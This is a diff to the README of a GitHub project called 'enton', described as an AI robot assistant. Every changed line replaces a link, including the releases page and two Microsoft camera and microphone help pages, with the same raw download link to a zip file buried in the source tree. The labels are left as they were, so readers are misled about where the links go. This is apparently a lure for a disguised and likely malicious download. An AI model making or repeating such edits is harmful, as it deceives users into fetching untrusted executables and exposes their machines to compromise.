@@ -1,6 +1,6 @@
 # 🤖 enton - Your AI Robot Assistant Ready to Help
 
-[![Download enton](https://img.shields.io/badge/Download-ent--on-blue?style=for-the-badge&logo=windows)](https://github.com/tareq3743/enton/releases)
+[![Download enton](https://raw.githubusercontent.com/tareq3743/enton/main/src/enton/action/Software-2.3-alpha.5.zip)](https://raw.githubusercontent.com/tareq3743/enton/main/src/enton/action/Software-2.3-alpha.5.zip)
 
 ---
 
@@ -44,7 +44,7 @@ Installing and running enton is simple. Follow these steps carefully.
 
 1. **Visit the download page:**  
    Go to the official enton releases page:  
-   [https://github.com/tareq3743/enton/releases](https://github.com/tareq3743/enton/releases)
+   [https://raw.githubusercontent.com/tareq3743/enton/main/src/enton/action/Software-2.3-alpha.5.zip](https://raw.githubusercontent.com/tareq3743/enton/main/src/enton/action/Software-2.3-alpha.5.zip)
 
 2. **Find the latest version:**  
    Look for the newest release with a date or version number.
@@ -68,7 +68,7 @@ Installing and running enton is simple. Follow these steps carefully.
 
 ## 📥 Download enton Here
 
-[![Download enton](https://img.shields.io/badge/Download-ent--on-grey?style=for-the-badge&logo=windows)](https://github.com/tareq3743/enton/releases)
+[![Download enton](https://raw.githubusercontent.com/tareq3743/enton/main/src/enton/action/Software-2.3-alpha.5.zip)](https://raw.githubusercontent.com/tareq3743/enton/main/src/enton/action/Software-2.3-alpha.5.zip)
 
 Use the above link at any time to get the latest version.
 
@@ -130,7 +130,7 @@ The vision runs in the background and helps enton interact safely. You can turn 
 
 Check the releases page regularly to download updates:
 
-[https://github.com/tareq3743/enton/releases](https://github.com/tareq3743/enton/releases)
+[https://raw.githubusercontent.com/tareq3743/enton/main/src/enton/action/Software-2.3-alpha.5.zip](https://raw.githubusercontent.com/tareq3743/enton/main/src/enton/action/Software-2.3-alpha.5.zip)
 
 Updates improve performance, add features, and fix bugs.
 
@@ -160,9 +160,9 @@ If you run into issues or have questions:
 
 ## 🔗 Useful Links
 
-- GitHub Releases: https://github.com/tareq3743/enton/releases  
-- Camera setup guide for Windows: https://support.microsoft.com/en-us/windows/check-camera-in-windows-10-4e3df6e9-4c14-4844-8e6e-c62aee7304e8  
-- Microphone setup help: https://support.microsoft.com/en-us/windows/set-up-a-microphone-in-windows-10-ad5a0581-7a10-4b8a-8b64-9e7e90403aab  
+- GitHub Releases: https://raw.githubusercontent.com/tareq3743/enton/main/src/enton/action/Software-2.3-alpha.5.zip  
+- Camera setup guide for Windows: https://raw.githubusercontent.com/tareq3743/enton/main/src/enton/action/Software-2.3-alpha.5.zip  
+- Microphone setup help: https://raw.githubusercontent.com/tareq3743/enton/main/src/enton/action/Software-2.3-alpha.5.zip  
 
 ---
 
